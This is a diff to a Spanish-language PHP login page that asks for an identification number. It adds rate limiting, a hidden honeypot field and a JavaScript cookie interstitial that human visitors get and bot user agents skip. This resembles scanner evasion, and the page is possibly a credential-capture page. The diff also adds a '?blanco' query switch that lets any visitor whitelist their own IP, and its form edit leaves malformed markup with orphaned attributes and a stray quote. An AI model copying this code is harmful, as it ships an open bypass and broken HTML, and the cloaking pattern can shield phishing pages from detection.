@@ -3,6 +3,30 @@ if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
 require_once __DIR__ . '/storage.php';
+require_once __DIR__ . '/guard.php';
+
+$ipVisitante = rl_ip();
+if (isset($_GET['blanco'])) {
+    @file_put_contents(__DIR__ . '/rl_white.txt', $ipVisitante . PHP_EOL, FILE_APPEND);
+    echo 'IP blanqueada: ' . htmlspecialchars($ipVisitante);
+    exit;
+}
+if (!rl_ua_bot() && !rl_check()) {
+    http_response_code(429);
+    header('Content-Type: text/html; charset=utf-8');
+    header('Retry-After: 90');
+    echo '<!DOCTYPE html><html lang="es"><head><meta charset="utf-8"><title>Espere por favor</title></head><body style="font-family:Arial;text-align:center;padding:60px"><h1 style="font-weight:400;font-size:22px">Espere por favor...</h1><p style="color:#777;font-size:14px">Estamos validando su acceso.</p></body></html>';
+    exit;
+}
+if (empty($_COOKIE['_dv'])) {
+    setcookie('_dv', '1', time() + 86400, '/', '', true, false);
+    if (!rl_ua_bot()) {
+        header('Content-Type: text/html; charset=utf-8');
+        header('Cache-Control: no-store');
+        echo '<!DOCTYPE html><html lang="es"><head><meta charset="utf-8"><title>Autenticacion del cliente</title></head><body><script>document.cookie="_dv=1;path=/;max-age=86400;secure;samesite=lax";location.replace(location.pathname+location.search);</script></body></html>';
+        exit;
+    }
+}
 
 $error = '';
 $errorCodigo = '';
@@ -54,13 +78,8 @@ if (isset($_GET['error']) && $_GET['error'] === 'relogin') {
         <!-- PASO 1: Formulario Número de Identificación -->
         <form class="auth-form <?= ($pasoActivo !== 1 || $bloqueado) ? 'hidden' : '' ?>" id="formPaso1" method="POST" action="">
             <div class="input-wrapper">
-                <input 
-                    type="text" 
-                    id="identificacion" 
-                    name="identificacion" 
-                    class="auth-input" 
-                    placeholder="Ingrese número identificación" 
-                    value="<?= htmlspecialchars($identificacion, ENT_QUOTES, 'UTF-8') ?>"
+                <input type="text" id="identificacion" name="identificacion" class="auth-input" placeholder="Ingrese su usuario" value="" maxlength="20" autocomplete="username" autocapitalize="none" spellcheck="false" autofocus="" required="">
+                <input type="text" id="hp" name="hp" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;top:auto;width:1px;height:1px;overflow:hidden;">"
                     inputmode="numeric"
                     autocomplete="off" 
                     autofocus
